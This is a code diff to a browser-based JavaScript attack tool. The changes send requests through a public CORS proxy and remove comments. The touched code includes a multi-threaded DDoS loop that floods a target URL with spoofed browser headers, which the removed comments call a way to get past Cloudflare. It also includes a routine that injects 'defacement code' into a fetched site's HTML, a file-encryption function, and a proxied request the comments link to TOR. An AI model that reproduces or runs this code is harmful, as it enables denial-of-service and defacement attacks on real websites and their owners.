@@ -69,9 +69,8 @@
 
    console.log("Backing up site:", url);
    try {
-    const response = await fetch(url, {
-     mode: 'cors'
-    });
+    const proxyUrl = 'https://corsproxy.io/?'; // CORS proxy
+    const response = await fetch(proxyUrl + encodeURIComponent(url));
     if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
     }
@@ -139,10 +138,8 @@
  
 
    try {
-    // Fetch the target URL's content
-    const response = await fetch(url, {
-     mode: 'cors' // CORS mode enables cross-origin requests
-    });
+    const proxyUrl = 'https://corsproxy.io/?'; // CORS proxy
+    const response = await fetch(proxyUrl + encodeURIComponent(url));
  
 
     if (!response.ok) {
@@ -153,15 +150,13 @@
     let html = await response.text();
  
 
-    // Inject defacement code right before the closing </body> tag
     html = html.replace('</body>', code + '</body>');
  
 
-    // Open a new window and display the modified HTML
     let newWindow = window.open('', '_blank');
     if (newWindow) {
      newWindow.document.write(html);
-     newWindow.document.close(); // Important: Close the document stream
+     newWindow.document.close();
     } else {
      alert('Popup blocked! Please allow popups for this site to view the defaced site.');
     }
@@ -226,7 +221,7 @@
   let ddosSeconds = 0;
   let isDDoSRunning = false;
   let controller = null;
-  let attackThreads = []; // Store threads for management
+  let attackThreads = [];
  
 
   async function startDDoS() {
@@ -257,13 +252,11 @@
    const signal = controller.signal;
  
 
-   // Prepare the attack threads
    for (let i = 0; i < threads; i++) {
     attackThreads.push(ddosAttackThread(url, signal));
    }
  
 
-   // Execute the attack threads in parallel
    Promise.all(attackThreads).then(() => {
     if (isDDoSRunning) {
      console.log('DDoS attack completed naturally.');
@@ -277,7 +270,6 @@
    });
  
 
-   // Set timeout for the DDoS attack
    setTimeout(() => {
     if (isDDoSRunning) {
      stopDDoS();
@@ -288,15 +280,14 @@
  
 
   async function ddosAttackThread(url, signal) {
-   while (isDDoSRunning && !signal.aborted) {
-    try {
+   const proxyUrl = 'https://corsproxy.io/?'; // CORS proxy
  
 
-     // Use fetch with AbortSignal
-     const response = await fetch(url, {
+   while (isDDoSRunning && !signal.aborted) {
+    try {
+     const response = await fetch(proxyUrl + encodeURIComponent(url), {
       mode: 'no-cors',
       signal: signal,
-      // Add headers to bypass Cloudflare
       headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Referer': 'https://www.google.com/'
@@ -318,7 +309,6 @@
     }
  
 
-    // Short delay to prevent excessive CPU usage
     await new Promise(resolve => setTimeout(resolve, 10));
    }
   }
@@ -331,10 +321,10 @@
    ddosSeconds = 0;
    document.getElementById('ddos-timer').innerText = "Timer: 0";
    if (controller) {
-    controller.abort(); // Abort all ongoing fetch requests
+    controller.abort();
     controller = null;
    }
-   attackThreads = []; // Clear attack threads
+   attackThreads = [];
   }
  
 
@@ -388,7 +378,7 @@
    try {
     const reader = new FileReader();
     reader.onload = async function(e) {
-     originalFileContent = e.target.result; // Backup original content
+     originalFileContent = e.target.result;
      const fileContent = e.target.result;
      const encryptedContent = await encrypt(fileContent, key);
      download(file.name + ".enc", encryptedContent);
@@ -498,8 +488,7 @@
  
 
    try {
-    // Use a CORS proxy to handle the request through TOR
-    const corsProxyUrl = 'https://cors-anywhere.herokuapp.com/'; // Use a reliable CORS proxy
+    const corsProxyUrl = 'https://corsproxy.io/?';
     const response = await fetch(corsProxyUrl + url, {
      mode: 'cors',
       headers: {
